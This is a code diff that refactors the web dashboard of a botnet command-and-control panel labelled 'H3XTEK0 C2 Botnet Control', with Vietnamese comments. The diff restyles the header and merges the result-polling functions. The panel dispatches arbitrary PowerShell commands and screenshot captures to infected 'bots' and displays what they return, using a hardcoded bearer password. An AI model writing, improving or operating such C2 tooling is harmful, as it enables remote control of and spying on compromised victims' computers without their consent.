@@ -8,7 +8,7 @@
     <style>
         /* ===== DASHBOARD SPECIFIC ===== */
         .container { max-width: 1440px; margin: 0 auto; padding: 20px; }
-        .header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; margin-bottom: 24px; flex-wrap: wrap; gap: 12px; }
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; margin-bottom: 24px; flex-wrap: wrap; gap: 12px; background: rgba(20, 10, 15, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 0, 51, 0.25); border-radius: 16px; }
         .header h1 { font-size: 24px; font-weight: 800; background: linear-gradient(135deg, #ff0033, #ff6688); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .header h1 .sub { font-size: 12px; font-weight: 400; -webkit-text-fill-color: rgba(255,255,255,0.4); display: block; }
         .password-badge { background: rgba(255, 0, 51, 0.2); border: 1px solid rgba(255, 0, 51, 0.3); padding: 6px 16px; border-radius: 20px; font-size: 12px; color: #ff6677; font-family: monospace; letter-spacing: 1px; }
@@ -62,7 +62,7 @@
         .modal-content .close { position: absolute; top: 12px; right: 18px; font-size: 28px; cursor: pointer; color: #884455; transition: color 0.3s; line-height: 1; }
         .modal-content .close:hover { color: #ff0033; }
         .modal-content h3 { color: #ff0033; margin-bottom: 16px; font-size: 18px; }
-        .modal-content pre { background: rgba(0,0,0,0.6); padding: 16px; border-radius: 8px; font-size: 13px; line-height: 1.6; overflow-x: auto; color: #ccdddd; max-height: 50vh; overflow-y: auto; border: 1px solid rgba(255, 0, 51, 0.1); font-family: 'Courier New', monospace; }
+        .modal-content pre { background: rgba(0,0,0,0.6); padding: 16px; border-radius: 8px; font-size: 13px; line-height: 1.6; overflow-x: auto; color: #ccdddd; max-height: 50vh; overflow-y: auto; border: 1px solid rgba(255, 0, 51, 0.1); font-family: 'Courier New', monospace; white-space: pre-wrap; word-break: break-word; }
         .modal-content .screenshot-img { width: 100%; border-radius: 8px; border: 1px solid rgba(255, 0, 51, 0.15); max-height: 60vh; object-fit: contain; background: #0a0a0f; }
         .modal-content .screenshot-actions { display: flex; gap: 10px; margin-top: 12px; flex-wrap: wrap; }
         .modal-content .screenshot-actions button { padding: 8px 20px; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 13px; transition: all 0.3s; }
@@ -109,7 +109,7 @@
 <body>
     <div class="container">
         <!-- HEADER -->
-        <div class="header glass">
+        <div class="header">
             <h1>⚡ H3XTEK0<span class="sub">C2 Botnet Control</span></h1>
             <div class="password-badge">🔑 H3XTEK0</div>
         </div>
@@ -181,7 +181,7 @@
         </div>
     </div>
 
-    <!-- MODAL: PS COMMAND (NHẬP LỆNH PS) -->
+    <!-- MODAL: PS COMMAND -->
     <div id="psModal" class="modal">
         <div class="modal-content">
             <span class="close" onclick="closeModal('psModal')">&times;</span>
@@ -198,9 +198,9 @@
     <script>
         const API_PASSWORD = 'H3XTEK0';
         let botsData = [];
-        let lastCmdId = null;
+        let currentPollingInterval = null;
+        let currentPollingCmdId = null;
         let lastScreenshotData = null;
-        let currentPsBotId = null;
 
         function getAuth() {
             return { 'Authorization': `Bearer ${API_PASSWORD}` };
@@ -283,6 +283,73 @@
         }
 
         // ============================================================
+        //  POLLING KẾT QUẢ - FIXED
+        // ============================================================
+        function pollResult(cmdId, botId, isScreenshot = false) {
+            // Dừng polling cũ nếu có
+            if (currentPollingInterval) {
+                clearInterval(currentPollingInterval);
+                currentPollingInterval = null;
+            }
+            
+            currentPollingCmdId = cmdId;
+            let attempts = 0;
+            const maxAttempts = 30; // 30 giây
+
+            currentPollingInterval = setInterval(async () => {
+                attempts++;
+                try {
+                    const res = await fetch(`/api/results/${cmdId}`, { headers: getAuth() });
+                    const data = await res.json();
+                    
+                    // Kiểm tra kết quả
+                    if (data.status === 'ok' || data.status === 'error') {
+                        clearInterval(currentPollingInterval);
+                        currentPollingInterval = null;
+                        
+                        const el = document.getElementById('cmdResultDisplay');
+                        
+                        if (isScreenshot && data.result && data.result.startsWith('data:image')) {
+                            // SCREENSHOT
+                            el.innerHTML = `<span class="ok">✅ Ảnh đã sẵn sàng</span>`;
+                            lastScreenshotData = data.result;
+                            document.getElementById('screenshotImage').src = data.result;
+                            openModal('screenshotModal');
+                            fetchBots();
+                            return;
+                        }
+                        
+                        if (data.result) {
+                            // KẾT QUẢ TEXT (PS, PING, ...)
+                            const preview = data.result.length > 60 ? data.result.substring(0, 60) + '...' : data.result;
+                            el.innerHTML = `<span class="ok">✅ ${preview}</span>`;
+                            document.getElementById('resultModalTitle').textContent = '📋 Kết quả lệnh';
+                            document.getElementById('resultContent').textContent = data.result;
+                            openModal('resultModal');
+                        } else {
+                            el.innerHTML = `<span class="error">⚠️ Không có kết quả</span>`;
+                        }
+                        fetchBots();
+                        return;
+                    }
+                    
+                    // Nếu vẫn pending
+                    if (attempts >= maxAttempts) {
+                        clearInterval(currentPollingInterval);
+                        currentPollingInterval = null;
+                        document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⏰ Hết thời gian chờ</span>`;
+                    }
+                } catch(e) {
+                    if (attempts >= maxAttempts) {
+                        clearInterval(currentPollingInterval);
+                        currentPollingInterval = null;
+                        document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">❌ Lỗi lấy kết quả</span>`;
+                    }
+                }
+            }, 1000);
+        }
+
+        // ============================================================
         //  GỬI LỆNH CHUNG
         // ============================================================
         async function sendCommand() {
@@ -308,66 +375,19 @@
             const data = await res.json();
 
             if (data.status === 'sent') {
-                lastCmdId = data.cmd_id;
-                document.getElementById('cmdResultDisplay').textContent = `⏳ Đã gửi, đợi... (${data.cmd_id.slice(-6)})`;
-
-                // Nếu là lệnh sc (screenshot), xử lý đặc biệt
-                if (command === 'sc') {
-                    pollForScreenshot(lastCmdId, botId);
-                    return;
-                }
-
-                // Nếu là lệnh ps, mở modal kết quả
-                if (command === 'ps') {
-                    pollForResult(lastCmdId, '💻 Kết quả PowerShell');
-                    return;
-                }
-
-                // Lệnh thông thường
-                pollForResult(lastCmdId, '📋 Kết quả lệnh');
+                const cmdId = data.cmd_id;
+                document.getElementById('cmdResultDisplay').textContent = `⏳ Đã gửi, đợi kết quả... (${cmdId.slice(-6)})`;
+                
+                // Xác định loại lệnh để polling đúng
+                const isScreenshot = (command === 'sc');
+                pollResult(cmdId, botId, isScreenshot);
             } else {
                 document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⚠️ ${data.status}: ${data.cmd_id}</span>`;
             }
         }
 
         // ============================================================
-        //  POLLING KẾT QUẢ (CHO PS, PING, ...)
-        // ============================================================
-        function pollForResult(cmdId, title) {
-            let attempts = 0;
-            const maxAttempts = 20;
-            const interval = setInterval(async () => {
-                attempts++;
-                try {
-                    const res = await fetch(`/api/results/${cmdId}`, { headers: getAuth() });
-                    const result = await res.json();
-                    if (result.status === 'ok' || result.status === 'error') {
-                        clearInterval(interval);
-                        const el = document.getElementById('cmdResultDisplay');
-                        if (result.result) {
-                            el.innerHTML = `<span class="ok">✅ ${result.result.substring(0, 60)}${result.result.length > 60 ? '...' : ''}</span>`;
-                            document.getElementById('resultModalTitle').textContent = title || '📋 Kết quả lệnh';
-                            document.getElementById('resultContent').textContent = result.result;
-                            openModal('resultModal');
-                        } else {
-                            el.innerHTML = `<span class="error">⚠️ Không có kết quả</span>`;
-                        }
-                        fetchBots();
-                    } else if (attempts >= maxAttempts) {
-                        clearInterval(interval);
-                        document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⏰ Hết thời gian chờ</span>`;
-                    }
-                } catch(e) {
-                    if (attempts >= maxAttempts) {
-                        clearInterval(interval);
-                        document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">❌ Lỗi lấy kết quả</span>`;
-                    }
-                }
-            }, 1000);
-        }
-
-        // ============================================================
-        //  SCREENSHOT - LẤY ẢNH VÀ HIỂN THỊ TRONG MODAL
+        //  SCREENSHOT
         // ============================================================
         async function takeScreenshot(botId) {
             if (!botId) { alert('Chọn Bot ID!'); return; }
@@ -385,48 +405,12 @@
             const data = await res.json();
 
             if (data.status === 'sent') {
-                lastCmdId = data.cmd_id;
-                document.getElementById('cmdResultDisplay').textContent = `⏳ Đã gửi, đợi ảnh...`;
-                pollForScreenshot(lastCmdId, botId);
+                const cmdId = data.cmd_id;
+                document.getElementById('cmdResultDisplay').textContent = `⏳ Đã gửi, đợi ảnh... (${cmdId.slice(-6)})`;
+                pollResult(cmdId, botId, true);
             } else {
                 document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⚠️ ${data.status}</span>`;
             }
-        }
-
-        function pollForScreenshot(cmdId, botId) {
-            let attempts = 0;
-            const maxAttempts = 20;
-            const interval = setInterval(async () => {
-                attempts++;
-                try {
-                    const res = await fetch(`/api/results/${cmdId}`, { headers: getAuth() });
-                    const result = await res.json();
-                    if (result.status === 'ok' || result.status === 'error') {
-                        clearInterval(interval);
-                        const el = document.getElementById('cmdResultDisplay');
-                        if (result.result && result.result.startsWith('data:image')) {
-                            el.innerHTML = `<span class="ok">✅ Ảnh đã sẵn sàng</span>`;
-                            // Hiển thị ảnh trong modal
-                            lastScreenshotData = result.result;
-                            document.getElementById('screenshotImage').src = result.result;
-                            openModal('screenshotModal');
-                        } else if (result.result) {
-                            el.innerHTML = `<span class="error">⚠️ Lỗi: ${result.result.substring(0, 50)}</span>`;
-                        } else {
-                            el.innerHTML = `<span class="error">⚠️ Không nhận được ảnh</span>`;
-                        }
-                        fetchBots();
-                    } else if (attempts >= maxAttempts) {
-                        clearInterval(interval);
-                        document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⏰ Hết thời gian chờ</span>`;
-                    }
-                } catch(e) {
-                    if (attempts >= maxAttempts) {
-                        clearInterval(interval);
-                        document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">❌ Lỗi lấy ảnh</span>`;
-                    }
-                }
-            }, 1000);
         }
 
         function refreshScreenshot() {
@@ -447,12 +431,12 @@
         }
 
         // ============================================================
-        //  PS COMMAND MODAL
+        //  PS COMMAND
         // ============================================================
         function openPsModal(botId) {
-            currentPsBotId = botId || document.getElementById('botIdInput').value.trim();
-            if (!currentPsBotId) { alert('Nhập Bot ID trước!'); return; }
-            document.getElementById('psBotIdInput').value = currentPsBotId;
+            const id = botId || document.getElementById('botIdInput').value.trim();
+            if (!id) { alert('Nhập Bot ID trước!'); return; }
+            document.getElementById('psBotIdInput').value = id;
             document.getElementById('psCommandInput').value = '';
             document.getElementById('psCommandInput').focus();
             openModal('psModal');
@@ -479,18 +463,20 @@
             const data = await res.json();
 
             if (data.status === 'sent') {
-                lastCmdId = data.cmd_id;
-                document.getElementById('cmdResultDisplay').textContent = `⏳ Đã gửi PS, đợi kết quả...`;
-                pollForResult(lastCmdId, '💻 Kết quả PowerShell');
+                const cmdId = data.cmd_id;
+                document.getElementById('cmdResultDisplay').textContent = `⏳ Đã gửi PS, đợi kết quả... (${cmdId.slice(-6)})`;
+                pollResult(cmdId, botId, false);
             } else {
                 document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⚠️ ${data.status}</span>`;
             }
         }
 
-        // Enter key trong PS modal
+        // Enter key
         document.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter' && document.getElementById('psModal').classList.contains('active')) {
-                sendPsCommand();
+            if (e.key === 'Enter') {
+                if (document.getElementById('psModal').classList.contains('active')) {
+                    sendPsCommand();
+                }
             }
         });
 
@@ -529,9 +515,10 @@
             });
         });
 
-        // Gán hàm openPsModal ra global
+        // Expose functions to global
         window.openPsModal = openPsModal;
         window.takeScreenshot = takeScreenshot;
+        window.sendCommand = sendCommand;
     </script>
 </body>
 </html>
